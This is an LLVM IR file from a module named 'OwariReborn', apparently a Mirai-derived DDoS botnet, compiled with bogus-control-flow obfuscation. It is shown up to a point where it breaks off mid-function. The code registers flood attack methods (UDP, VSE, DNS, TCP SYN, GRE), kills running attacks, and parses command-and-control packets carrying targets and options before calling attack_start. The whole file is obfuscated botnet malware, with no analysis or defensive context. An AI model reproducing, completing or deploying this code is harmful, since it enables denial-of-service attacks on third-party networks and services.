; ModuleID = 'host/ir_bcf/OwariReborn.ll'
source_filename = "llvm-link"
target datalayout = "e-m:e-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.attack_method = type { void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)*, i8 }
%struct.attack_target = type { %struct.sockaddr_in, i32, i8 }
%struct.sockaddr_in = type { i16, i16, %struct.in_addr, [8 x i8] }
%struct.in_addr = type { i32 }
%struct.attack_option = type { i8*, i8 }
%struct.table_value = type { i8*, i16 }
%struct.iphdr = type { i8, i8, i16, i16, i16, i8, i8, i16, i32, i32 }
%struct.grehdr = type { i16, i16 }
%struct.udphdr = type { i16, i16, i16, i16 }
%union.__CONST_SOCKADDR_ARG = type { %struct.sockaddr* }
%struct.sockaddr = type { i16, [14 x i8] }
%struct.ethhdr = type { [6 x i8], [6 x i8], i16 }
%struct.tcphdr = type { i16, i16, i32, i32, i16, i16, i16, i16 }
%struct.dnshdr = type { i16, i16, i16, i16, i16, i16 }

@methods_len = global i8 0, align 1
@methods = global %struct.attack_method** null, align 8
@attack_ongoing = global [8 x i32] [i32 5, i32 0, i32 0, i32 0, i32 0, i32 0, i32 0, i32 0], align 16
@LOCAL_ADDR = common global i32 0, align 4
@x = internal global i32 0, align 4
@y = internal global i32 0, align 4
@z = internal global i32 0, align 4
@w = internal global i32 0, align 4
@table = common global [43 x %struct.table_value] zeroinitializer, align 16
@table_key = global i32 322420947, align 4
@x.1 = common global i32 0
@y.2 = common global i32 0
@x.3 = common global i32 0
@y.4 = common global i32 0
@x.5 = common global i32 0
@y.6 = common global i32 0
@x.7 = common global i32 0
@y.8 = common global i32 0
@x.9 = common global i32 0
@y.10 = common global i32 0
@x.11 = common global i32 0
@y.12 = common global i32 0
@x.13 = common global i32 0
@y.14 = common global i32 0
@x.15 = common global i32 0
@y.16 = common global i32 0
@x.17 = common global i32 0
@y.18 = common global i32 0
@x.19 = common global i32 0
@y.20 = common global i32 0
@x.21 = common global i32 0
@y.22 = common global i32 0
@x.23 = common global i32 0
@y.24 = common global i32 0
@x.25 = common global i32 0
@y.26 = common global i32 0
@x.27 = common global i32 0
@y.28 = common global i32 0
@x.29 = common global i32 0
@y.30 = common global i32 0
@x.31 = common global i32 0
@y.32 = common global i32 0
@x.33 = common global i32 0
@y.34 = common global i32 0
@x.35 = common global i32 0
@y.36 = common global i32 0
@x.37 = common global i32 0
@y.38 = common global i32 0
@x.39 = common global i32 0
@y.40 = common global i32 0
@x.41 = common global i32 0
@y.42 = common global i32 0
@x.43 = common global i32 0
@y.44 = common global i32 0
@x.45 = common global i32 0
@y.46 = common global i32 0
@x.47 = common global i32 0
@y.48 = common global i32 0
@x.49 = common global i32 0
@y.50 = common global i32 0

; Function Attrs: noinline nounwind uwtable
define signext i8 @attack_init() #0 {
  %1 = alloca i32, align 4
  store i32 0, i32* %1, align 4
  call void @add_attack(i8 zeroext 0, void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_udp_generic)
  call void @add_attack(i8 zeroext 1, void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_udp_vse)
  call void @add_attack(i8 zeroext 2, void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_udp_dns)
  call void @add_attack(i8 zeroext 8, void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_udp_plain)
  call void @add_attack(i8 zeroext 3, void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_tcp_syn)
  call void @add_attack(i8 zeroext 6, void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_gre_ip)
  call void @add_attack(i8 zeroext 7, void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_gre_eth)
  ret i8 1
}

; Function Attrs: noinline nounwind uwtable
define internal void @add_attack(i8 zeroext, void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)*) #0 {
  %3 = alloca i8, align 1
  %4 = alloca void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)*, align 8
  %5 = alloca %struct.attack_method*, align 8
  store i8 %0, i8* %3, align 1
  store void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)* %1, void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)** %4, align 8
  %6 = call noalias i8* @calloc(i64 1, i64 16) #6
  %7 = bitcast i8* %6 to %struct.attack_method*
  store %struct.attack_method* %7, %struct.attack_method** %5, align 8
  %8 = load i8, i8* %3, align 1
  %9 = load %struct.attack_method*, %struct.attack_method** %5, align 8
  %10 = getelementptr inbounds %struct.attack_method, %struct.attack_method* %9, i32 0, i32 1
  store i8 %8, i8* %10, align 8
  %11 = load void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)*, void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)** %4, align 8
  %12 = load %struct.attack_method*, %struct.attack_method** %5, align 8
  %13 = getelementptr inbounds %struct.attack_method, %struct.attack_method* %12, i32 0, i32 0
  store void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)* %11, void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)** %13, align 8
  %14 = load %struct.attack_method**, %struct.attack_method*** @methods, align 8
  %15 = bitcast %struct.attack_method** %14 to i8*
  %16 = load i8, i8* @methods_len, align 1
  %17 = zext i8 %16 to i32
  %18 = add nsw i32 %17, 1
  %19 = sext i32 %18 to i64
  %20 = mul i64 %19, 8
  %21 = call i8* @realloc(i8* %15, i64 %20) #6
  %22 = bitcast i8* %21 to %struct.attack_method**
  store %struct.attack_method** %22, %struct.attack_method*** @methods, align 8
  %23 = load %struct.attack_method*, %struct.attack_method** %5, align 8
  %24 = load %struct.attack_method**, %struct.attack_method*** @methods, align 8
  %25 = load i8, i8* @methods_len, align 1
  %26 = add i8 %25, 1
  store i8 %26, i8* @methods_len, align 1
  %27 = zext i8 %25 to i64
  %28 = getelementptr inbounds %struct.attack_method*, %struct.attack_method** %24, i64 %27
  store %struct.attack_method* %23, %struct.attack_method** %28, align 8
  ret void
}

; Function Attrs: nounwind
declare noalias i8* @calloc(i64, i64) #1

; Function Attrs: nounwind
declare i8* @realloc(i8*, i64) #1

; Function Attrs: noinline nounwind uwtable
define void @attack_kill_all() #0 {
  %1 = alloca i32, align 4
  store i32 0, i32* %1, align 4
  br label %2

; <label>:2:                                      ; preds = %21, %0
  %3 = load i32, i32* %1, align 4
  %4 = icmp slt i32 %3, 8
  br i1 %4, label %5, label %24

; <label>:5:                                      ; preds = %2
  %6 = load i32, i32* %1, align 4
  %7 = sext i32 %6 to i64
  %8 = getelementptr inbounds [8 x i32], [8 x i32]* @attack_ongoing, i64 0, i64 %7
  %9 = load i32, i32* %8, align 4
  %10 = icmp ne i32 %9, 0
  br i1 %10, label %11, label %17

; <label>:11:                                     ; preds = %5
  %12 = load i32, i32* %1, align 4
  %13 = sext i32 %12 to i64
  %14 = getelementptr inbounds [8 x i32], [8 x i32]* @attack_ongoing, i64 0, i64 %13
  %15 = load i32, i32* %14, align 4
  %16 = call i32 @kill(i32 %15, i32 9) #6
  br label %17

; <label>:17:                                     ; preds = %11, %5
  %18 = load i32, i32* %1, align 4
  %19 = sext i32 %18 to i64
  %20 = getelementptr inbounds [8 x i32], [8 x i32]* @attack_ongoing, i64 0, i64 %19
  store i32 0, i32* %20, align 4
  br label %21

; <label>:21:                                     ; preds = %17
  %22 = load i32, i32* %1, align 4
  %23 = add nsw i32 %22, 1
  store i32 %23, i32* %1, align 4
  br label %2

; <label>:24:                                     ; preds = %2
  %25 = load i32, i32* @x.5
  %26 = load i32, i32* @y.6
  %27 = sub i32 %25, 1
  %28 = mul i32 %25, %27
  %29 = urem i32 %28, 2
  %30 = icmp eq i32 %29, 0
  %31 = icmp slt i32 %26, 10
  %32 = or i1 %30, %31
  br i1 %32, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %24
  %33 = load i32, i32* @x.5
  %34 = load i32, i32* @y.6
  %35 = sub i32 %33, 1
  %36 = mul i32 %33, %35
  %37 = urem i32 %36, 2
  %38 = icmp eq i32 %37, 0
  %39 = icmp slt i32 %34, 10
  %40 = or i1 %38, %39
  br i1 %40, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %24
  br label %originalBB
}

; Function Attrs: nounwind
declare i32 @kill(i32, i32) #1

; Function Attrs: noinline nounwind uwtable
define void @attack_parse(i8*, i32) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i8, align 1
  %8 = alloca i8, align 1
  %9 = alloca i8, align 1
  %10 = alloca %struct.attack_target*, align 8
  %11 = alloca %struct.attack_option*, align 8
  %12 = alloca i8, align 1
  store i8* %0, i8** %3, align 8
  store i32 %1, i32* %4, align 4
  store i32 0, i32* %5, align 4
  store %struct.attack_target* null, %struct.attack_target** %10, align 8
  store %struct.attack_option* null, %struct.attack_option** %11, align 8
  %13 = load i32, i32* %4, align 4
  %14 = sext i32 %13 to i64
  %15 = icmp ult i64 %14, 4
  br i1 %15, label %16, label %17

; <label>:16:                                     ; preds = %2
  br label %395

; <label>:17:                                     ; preds = %2
  %18 = load i32, i32* @x.7
  %19 = load i32, i32* @y.8
  %20 = sub i32 %18, 1
  %21 = mul i32 %18, %20
  %22 = urem i32 %21, 2
  %23 = icmp eq i32 %22, 0
  %24 = icmp slt i32 %19, 10
  %25 = or i1 %23, %24
  br i1 %25, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %17
  %26 = load i8*, i8** %3, align 8
  %27 = bitcast i8* %26 to i32*
  %28 = load i32, i32* %27, align 4
  %29 = call i32 @ntohl(i32 %28) #7
  store i32 %29, i32* %6, align 4
  %30 = load i8*, i8** %3, align 8
  %31 = getelementptr inbounds i8, i8* %30, i64 4
  store i8* %31, i8** %3, align 8
  %32 = load i32, i32* %4, align 4
  %33 = sext i32 %32 to i64
  %34 = sub i64 %33, 4
  %35 = trunc i64 %34 to i32
  store i32 %35, i32* %4, align 4
  %36 = load i32, i32* %4, align 4
  %37 = icmp eq i32 %36, 0
  %38 = load i32, i32* @x.7
  %39 = load i32, i32* @y.8
  %40 = sub i32 %38, 1
  %41 = mul i32 %38, %40
  %42 = urem i32 %41, 2
  %43 = icmp eq i32 %42, 0
  %44 = icmp slt i32 %39, 10
  %45 = or i1 %43, %44
  br i1 %45, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %37, label %46, label %47

; <label>:46:                                     ; preds = %originalBBpart2
  br label %395

; <label>:47:                                     ; preds = %originalBBpart2
  %48 = load i8*, i8** %3, align 8
  %49 = getelementptr inbounds i8, i8* %48, i32 1
  store i8* %49, i8** %3, align 8
  %50 = load i8, i8* %48, align 1
  store i8 %50, i8* %7, align 1
  %51 = load i32, i32* %4, align 4
  %52 = sext i32 %51 to i64
  %53 = sub i64 %52, 1
  %54 = trunc i64 %53 to i32
  store i32 %54, i32* %4, align 4
  %55 = load i32, i32* %4, align 4
  %56 = icmp eq i32 %55, 0
  br i1 %56, label %57, label %74

; <label>:57:                                     ; preds = %47
  %58 = load i32, i32* @x.7
  %59 = load i32, i32* @y.8
  %60 = sub i32 %58, 1
  %61 = mul i32 %58, %60
  %62 = urem i32 %61, 2
  %63 = icmp eq i32 %62, 0
  %64 = icmp slt i32 %59, 10
  %65 = or i1 %63, %64
  br i1 %65, label %originalBB3, label %originalBB3alteredBB

originalBB3:                                      ; preds = %originalBB3alteredBB, %57
  %66 = load i32, i32* @x.7
  %67 = load i32, i32* @y.8
  %68 = sub i32 %66, 1
  %69 = mul i32 %66, %68
  %70 = urem i32 %69, 2
  %71 = icmp eq i32 %70, 0
  %72 = icmp slt i32 %67, 10
  %73 = or i1 %71, %72
  br i1 %73, label %originalBBpart25, label %originalBB3alteredBB

originalBBpart25:                                 ; preds = %originalBB3
  br label %395

; <label>:74:                                     ; preds = %47
  %75 = load i8*, i8** %3, align 8
  %76 = getelementptr inbounds i8, i8* %75, i32 1
  store i8* %76, i8** %3, align 8
  %77 = load i8, i8* %75, align 1
  store i8 %77, i8* %8, align 1
  %78 = load i32, i32* %4, align 4
  %79 = sext i32 %78 to i64
  %80 = sub i64 %79, 1
  %81 = trunc i64 %80 to i32
  store i32 %81, i32* %4, align 4
  %82 = load i8, i8* %8, align 1
  %83 = zext i8 %82 to i32
  %84 = icmp eq i32 %83, 0
  br i1 %84, label %85, label %102

; <label>:85:                                     ; preds = %74
  %86 = load i32, i32* @x.7
  %87 = load i32, i32* @y.8
  %88 = sub i32 %86, 1
  %89 = mul i32 %86, %88
  %90 = urem i32 %89, 2
  %91 = icmp eq i32 %90, 0
  %92 = icmp slt i32 %87, 10
  %93 = or i1 %91, %92
  br i1 %93, label %originalBB7, label %originalBB7alteredBB

originalBB7:                                      ; preds = %originalBB7alteredBB, %85
  %94 = load i32, i32* @x.7
  %95 = load i32, i32* @y.8
  %96 = sub i32 %94, 1
  %97 = mul i32 %94, %96
  %98 = urem i32 %97, 2
  %99 = icmp eq i32 %98, 0
  %100 = icmp slt i32 %95, 10
  %101 = or i1 %99, %100
  br i1 %101, label %originalBBpart29, label %originalBB7alteredBB

originalBBpart29:                                 ; preds = %originalBB7
  br label %395

; <label>:102:                                    ; preds = %74
  %103 = load i32, i32* @x.7
  %104 = load i32, i32* @y.8
  %105 = sub i32 %103, 1
  %106 = mul i32 %103, %105
  %107 = urem i32 %106, 2
  %108 = icmp eq i32 %107, 0
  %109 = icmp slt i32 %104, 10
  %110 = or i1 %108, %109
  br i1 %110, label %originalBB11, label %originalBB11alteredBB

originalBB11:                                     ; preds = %originalBB11alteredBB, %102
  %111 = load i32, i32* %4, align 4
  %112 = sext i32 %111 to i64
  %113 = load i8, i8* %8, align 1
  %114 = zext i8 %113 to i64
  %115 = mul i64 5, %114
  %116 = icmp ult i64 %112, %115
  %117 = load i32, i32* @x.7
  %118 = load i32, i32* @y.8
  %119 = sub i32 %117, 1
  %120 = mul i32 %117, %119
  %121 = urem i32 %120, 2
  %122 = icmp eq i32 %121, 0
  %123 = icmp slt i32 %118, 10
  %124 = or i1 %122, %123
  br i1 %124, label %originalBBpart221, label %originalBB11alteredBB

originalBBpart221:                                ; preds = %originalBB11
  br i1 %116, label %125, label %142

; <label>:125:                                    ; preds = %originalBBpart221
  %126 = load i32, i32* @x.7
  %127 = load i32, i32* @y.8
  %128 = sub i32 %126, 1
  %129 = mul i32 %126, %128
  %130 = urem i32 %129, 2
  %131 = icmp eq i32 %130, 0
  %132 = icmp slt i32 %127, 10
  %133 = or i1 %131, %132
  br i1 %133, label %originalBB23, label %originalBB23alteredBB

originalBB23:                                     ; preds = %originalBB23alteredBB, %125
  %134 = load i32, i32* @x.7
  %135 = load i32, i32* @y.8
  %136 = sub i32 %134, 1
  %137 = mul i32 %134, %136
  %138 = urem i32 %137, 2
  %139 = icmp eq i32 %138, 0
  %140 = icmp slt i32 %135, 10
  %141 = or i1 %139, %140
  br i1 %141, label %originalBBpart225, label %originalBB23alteredBB

originalBBpart225:                                ; preds = %originalBB23
  br label %395

; <label>:142:                                    ; preds = %originalBBpart221
  %143 = load i32, i32* @x.7
  %144 = load i32, i32* @y.8
  %145 = sub i32 %143, 1
  %146 = mul i32 %143, %145
  %147 = urem i32 %146, 2
  %148 = icmp eq i32 %147, 0
  %149 = icmp slt i32 %144, 10
  %150 = or i1 %148, %149
  br i1 %150, label %originalBB27, label %originalBB27alteredBB

originalBB27:                                     ; preds = %originalBB27alteredBB, %142
  %151 = load i8, i8* %8, align 1
  %152 = zext i8 %151 to i64
  %153 = call noalias i8* @calloc(i64 %152, i64 24) #6
  %154 = bitcast i8* %153 to %struct.attack_target*
  store %struct.attack_target* %154, %struct.attack_target** %10, align 8
  store i32 0, i32* %5, align 4
  %155 = load i32, i32* @x.7
  %156 = load i32, i32* @y.8
  %157 = sub i32 %155, 1
  %158 = mul i32 %155, %157
  %159 = urem i32 %158, 2
  %160 = icmp eq i32 %159, 0
  %161 = icmp slt i32 %156, 10
  %162 = or i1 %160, %161
  br i1 %162, label %originalBBpart229, label %originalBB27alteredBB

originalBBpart229:                                ; preds = %originalBB27
  br label %163

; <label>:163:                                    ; preds = %210, %originalBBpart229
  %164 = load i32, i32* %5, align 4
  %165 = load i8, i8* %8, align 1
  %166 = zext i8 %165 to i32
  %167 = icmp slt i32 %164, %166
  br i1 %167, label %168, label %213

; <label>:168:                                    ; preds = %163
  %169 = load i8*, i8** %3, align 8
  %170 = bitcast i8* %169 to i32*
  %171 = load i32, i32* %170, align 4
  %172 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %173 = load i32, i32* %5, align 4
  %174 = sext i32 %173 to i64
  %175 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %172, i64 %174
  %176 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %175, i32 0, i32 1
  store i32 %171, i32* %176, align 4
  %177 = load i8*, i8** %3, align 8
  %178 = getelementptr inbounds i8, i8* %177, i64 4
  store i8* %178, i8** %3, align 8
  %179 = load i8*, i8** %3, align 8
  %180 = getelementptr inbounds i8, i8* %179, i32 1
  store i8* %180, i8** %3, align 8
  %181 = load i8, i8* %179, align 1
  %182 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %183 = load i32, i32* %5, align 4
  %184 = sext i32 %183 to i64
  %185 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %182, i64 %184
  %186 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %185, i32 0, i32 2
  store i8 %181, i8* %186, align 4
  %187 = load i32, i32* %4, align 4
  %188 = sext i32 %187 to i64
  %189 = sub i64 %188, 5
  %190 = trunc i64 %189 to i32
  store i32 %190, i32* %4, align 4
  %191 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %192 = load i32, i32* %5, align 4
  %193 = sext i32 %192 to i64
  %194 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %191, i64 %193
  %195 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %194, i32 0, i32 0
  %196 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %195, i32 0, i32 0
  store i16 2, i16* %196, align 4
  %197 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %198 = load i32, i32* %5, align 4
  %199 = sext i32 %198 to i64
  %200 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %197, i64 %199
  %201 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %200, i32 0, i32 1
  %202 = load i32, i32* %201, align 4
  %203 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %204 = load i32, i32* %5, align 4
  %205 = sext i32 %204 to i64
  %206 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %203, i64 %205
  %207 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %206, i32 0, i32 0
  %208 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %207, i32 0, i32 2
  %209 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %208, i32 0, i32 0
  store i32 %202, i32* %209, align 4
  br label %210

; <label>:210:                                    ; preds = %168
  %211 = load i32, i32* %5, align 4
  %212 = add nsw i32 %211, 1
  store i32 %212, i32* %5, align 4
  br label %163

; <label>:213:                                    ; preds = %163
  %214 = load i32, i32* %4, align 4
  %215 = sext i32 %214 to i64
  %216 = icmp ult i64 %215, 1
  br i1 %216, label %217, label %218

; <label>:217:                                    ; preds = %213
  br label %395

; <label>:218:                                    ; preds = %213
  %219 = load i8*, i8** %3, align 8
  %220 = getelementptr inbounds i8, i8* %219, i32 1
  store i8* %220, i8** %3, align 8
  %221 = load i8, i8* %219, align 1
  store i8 %221, i8* %9, align 1
  %222 = load i32, i32* %4, align 4
  %223 = sext i32 %222 to i64
  %224 = sub i64 %223, 1
  %225 = trunc i64 %224 to i32
  store i32 %225, i32* %4, align 4
  %226 = load i8, i8* %9, align 1
  %227 = zext i8 %226 to i32
  %228 = icmp sgt i32 %227, 0
  br i1 %228, label %229, label %387

; <label>:229:                                    ; preds = %218
  %230 = load i8, i8* %9, align 1
  %231 = zext i8 %230 to i64
  %232 = call noalias i8* @calloc(i64 %231, i64 16) #6
  %233 = bitcast i8* %232 to %struct.attack_option*
  store %struct.attack_option* %233, %struct.attack_option** %11, align 8
  store i32 0, i32* %5, align 4
  br label %234

; <label>:234:                                    ; preds = %367, %229
  %235 = load i32, i32* %5, align 4
  %236 = load i8, i8* %9, align 1
  %237 = zext i8 %236 to i32
  %238 = icmp slt i32 %235, %237
  br i1 %238, label %239, label %370

; <label>:239:                                    ; preds = %234
  %240 = load i32, i32* @x.7
  %241 = load i32, i32* @y.8
  %242 = sub i32 %240, 1
  %243 = mul i32 %240, %242
  %244 = urem i32 %243, 2
  %245 = icmp eq i32 %244, 0
  %246 = icmp slt i32 %241, 10
  %247 = or i1 %245, %246
  br i1 %247, label %originalBB31, label %originalBB31alteredBB

originalBB31:                                     ; preds = %originalBB31alteredBB, %239
  %248 = load i32, i32* %4, align 4
  %249 = sext i32 %248 to i64
  %250 = icmp ult i64 %249, 1
  %251 = load i32, i32* @x.7
  %252 = load i32, i32* @y.8
  %253 = sub i32 %251, 1
  %254 = mul i32 %251, %253
  %255 = urem i32 %254, 2
  %256 = icmp eq i32 %255, 0
  %257 = icmp slt i32 %252, 10
  %258 = or i1 %256, %257
  br i1 %258, label %originalBBpart233, label %originalBB31alteredBB

originalBBpart233:                                ; preds = %originalBB31
  br i1 %250, label %259, label %276

; <label>:259:                                    ; preds = %originalBBpart233
  %260 = load i32, i32* @x.7
  %261 = load i32, i32* @y.8
  %262 = sub i32 %260, 1
  %263 = mul i32 %260, %262
  %264 = urem i32 %263, 2
  %265 = icmp eq i32 %264, 0
  %266 = icmp slt i32 %261, 10
  %267 = or i1 %265, %266
  br i1 %267, label %originalBB35, label %originalBB35alteredBB

originalBB35:                                     ; preds = %originalBB35alteredBB, %259
  %268 = load i32, i32* @x.7
  %269 = load i32, i32* @y.8
  %270 = sub i32 %268, 1
  %271 = mul i32 %268, %270
  %272 = urem i32 %271, 2
  %273 = icmp eq i32 %272, 0
  %274 = icmp slt i32 %269, 10
  %275 = or i1 %273, %274
  br i1 %275, label %originalBBpart237, label %originalBB35alteredBB

originalBBpart237:                                ; preds = %originalBB35
  br label %395

; <label>:276:                                    ; preds = %originalBBpart233
  %277 = load i32, i32* @x.7
  %278 = load i32, i32* @y.8
  %279 = sub i32 %277, 1
  %280 = mul i32 %277, %279
  %281 = urem i32 %280, 2
  %282 = icmp eq i32 %281, 0
  %283 = icmp slt i32 %278, 10
  %284 = or i1 %282, %283
  br i1 %284, label %originalBB39, label %originalBB39alteredBB

originalBB39:                                     ; preds = %originalBB39alteredBB, %276
  %285 = load i8*, i8** %3, align 8
  %286 = getelementptr inbounds i8, i8* %285, i32 1
  store i8* %286, i8** %3, align 8
  %287 = load i8, i8* %285, align 1
  %288 = load %struct.attack_option*, %struct.attack_option** %11, align 8
  %289 = load i32, i32* %5, align 4
  %290 = sext i32 %289 to i64
  %291 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %288, i64 %290
  %292 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %291, i32 0, i32 1
  store i8 %287, i8* %292, align 8
  %293 = load i32, i32* %4, align 4
  %294 = sext i32 %293 to i64
  %295 = sub i64 %294, 1
  %296 = trunc i64 %295 to i32
  store i32 %296, i32* %4, align 4
  %297 = load i32, i32* %4, align 4
  %298 = sext i32 %297 to i64
  %299 = icmp ult i64 %298, 1
  %300 = load i32, i32* @x.7
  %301 = load i32, i32* @y.8
  %302 = sub i32 %300, 1
  %303 = mul i32 %300, %302
  %304 = urem i32 %303, 2
  %305 = icmp eq i32 %304, 0
  %306 = icmp slt i32 %301, 10
  %307 = or i1 %305, %306
  br i1 %307, label %originalBBpart246, label %originalBB39alteredBB

originalBBpart246:                                ; preds = %originalBB39
  br i1 %299, label %308, label %325

; <label>:308:                                    ; preds = %originalBBpart246
  %309 = load i32, i32* @x.7
  %310 = load i32, i32* @y.8
  %311 = sub i32 %309, 1
  %312 = mul i32 %309, %311
  %313 = urem i32 %312, 2
  %314 = icmp eq i32 %313, 0
  %315 = icmp slt i32 %310, 10
  %316 = or i1 %314, %315
  br i1 %316, label %originalBB48, label %originalBB48alteredBB

originalBB48:                                     ; preds = %originalBB48alteredBB, %308
  %317 = load i32, i32* @x.7
  %318 = load i32, i32* @y.8
  %319 = sub i32 %317, 1
  %320 = mul i32 %317, %319
  %321 = urem i32 %320, 2
  %322 = icmp eq i32 %321, 0
  %323 = icmp slt i32 %318, 10
  %324 = or i1 %322, %323
  br i1 %324, label %originalBBpart250, label %originalBB48alteredBB

originalBBpart250:                                ; preds = %originalBB48
  br label %395

; <label>:325:                                    ; preds = %originalBBpart246
  %326 = load i8*, i8** %3, align 8
  %327 = getelementptr inbounds i8, i8* %326, i32 1
  store i8* %327, i8** %3, align 8
  %328 = load i8, i8* %326, align 1
  store i8 %328, i8* %12, align 1
  %329 = load i32, i32* %4, align 4
  %330 = sext i32 %329 to i64
  %331 = sub i64 %330, 1
  %332 = trunc i64 %331 to i32
  store i32 %332, i32* %4, align 4
  %333 = load i32, i32* %4, align 4
  %334 = load i8, i8* %12, align 1
  %335 = zext i8 %334 to i32
  %336 = icmp slt i32 %333, %335
  br i1 %336, label %337, label %338

; <label>:337:                                    ; preds = %325
  br label %395

; <label>:338:                                    ; preds = %325
  %339 = load i8, i8* %12, align 1
  %340 = zext i8 %339 to i32
  %341 = add nsw i32 %340, 1
  %342 = sext i32 %341 to i64
  %343 = call noalias i8* @calloc(i64 %342, i64 1) #6
  %344 = load %struct.attack_option*, %struct.attack_option** %11, align 8
  %345 = load i32, i32* %5, align 4
  %346 = sext i32 %345 to i64
  %347 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %344, i64 %346
  %348 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %347, i32 0, i32 0
  store i8* %343, i8** %348, align 8
  %349 = load %struct.attack_option*, %struct.attack_option** %11, align 8
  %350 = load i32, i32* %5, align 4
  %351 = sext i32 %350 to i64
  %352 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %349, i64 %351
  %353 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %352, i32 0, i32 0
  %354 = load i8*, i8** %353, align 8
  %355 = load i8*, i8** %3, align 8
  %356 = load i8, i8* %12, align 1
  %357 = zext i8 %356 to i32
  call void @util_memcpy(i8* %354, i8* %355, i32 %357)
  %358 = load i8, i8* %12, align 1
  %359 = zext i8 %358 to i32
  %360 = load i8*, i8** %3, align 8
  %361 = sext i32 %359 to i64
  %362 = getelementptr inbounds i8, i8* %360, i64 %361
  store i8* %362, i8** %3, align 8
  %363 = load i8, i8* %12, align 1
  %364 = zext i8 %363 to i32
  %365 = load i32, i32* %4, align 4
  %366 = sub nsw i32 %365, %364
  store i32 %366, i32* %4, align 4
  br label %367

; <label>:367:                                    ; preds = %338
  %368 = load i32, i32* %5, align 4
  %369 = add nsw i32 %368, 1
  store i32 %369, i32* %5, align 4
  br label %234

; <label>:370:                                    ; preds = %234
  %371 = load i32, i32* @x.7
  %372 = load i32, i32* @y.8
  %373 = sub i32 %371, 1
  %374 = mul i32 %371, %373
  %375 = urem i32 %374, 2
  %376 = icmp eq i32 %375, 0
  %377 = icmp slt i32 %372, 10
  %378 = or i1 %376, %377
  br i1 %378, label %originalBB52, label %originalBB52alteredBB

originalBB52:                                     ; preds = %originalBB52alteredBB, %370
  %379 = load i32, i32* @x.7
  %380 = load i32, i32* @y.8
  %381 = sub i32 %379, 1
  %382 = mul i32 %379, %381
  %383 = urem i32 %382, 2
  %384 = icmp eq i32 %383, 0
  %385 = icmp slt i32 %380, 10
  %386 = or i1 %384, %385
  br i1 %386, label %originalBBpart254, label %originalBB52alteredBB

originalBBpart254:                                ; preds = %originalBB52
  br label %387

; <label>:387:                                    ; preds = %originalBBpart254, %218
  %388 = call i32* @__errno_location() #7
  store i32 0, i32* %388, align 4
  %389 = load i32, i32* %6, align 4
  %390 = load i8, i8* %7, align 1
  %391 = load i8, i8* %8, align 1
  %392 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %393 = load i8, i8* %9, align 1
  %394 = load %struct.attack_option*, %struct.attack_option** %11, align 8
  call void @attack_start(i32 %389, i8 zeroext %390, i8 zeroext %391, %struct.attack_target* %392, i8 zeroext %393, %struct.attack_option* %394)
  br label %395

; <label>:395:                                    ; preds = %387, %337, %originalBBpart250, %originalBBpart237, %217, %originalBBpart225, %originalBBpart29, %originalBBpart25, %46, %16
  %396 = load i32, i32* @x.7
  %397 = load i32, i32* @y.8
  %398 = sub i32 %396, 1
  %399 = mul i32 %396, %398
  %400 = urem i32 %399, 2
  %401 = icmp eq i32 %400, 0
  %402 = icmp slt i32 %397, 10
  %403 = or i1 %401, %402
  br i1 %403, label %originalBB56, label %originalBB56alteredBB

originalBB56:                                     ; preds = %originalBB56alteredBB, %395
  %404 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %405 = icmp ne %struct.attack_target* %404, null
  %406 = load i32, i32* @x.7
  %407 = load i32, i32* @y.8
  %408 = sub i32 %406, 1
  %409 = mul i32 %406, %408
  %410 = urem i32 %409, 2
  %411 = icmp eq i32 %410, 0
  %412 = icmp slt i32 %407, 10
  %413 = or i1 %411, %412
  br i1 %413, label %originalBBpart258, label %originalBB56alteredBB

originalBBpart258:                                ; preds = %originalBB56
  br i1 %405, label %414, label %433

; <label>:414:                                    ; preds = %originalBBpart258
  %415 = load i32, i32* @x.7
  %416 = load i32, i32* @y.8
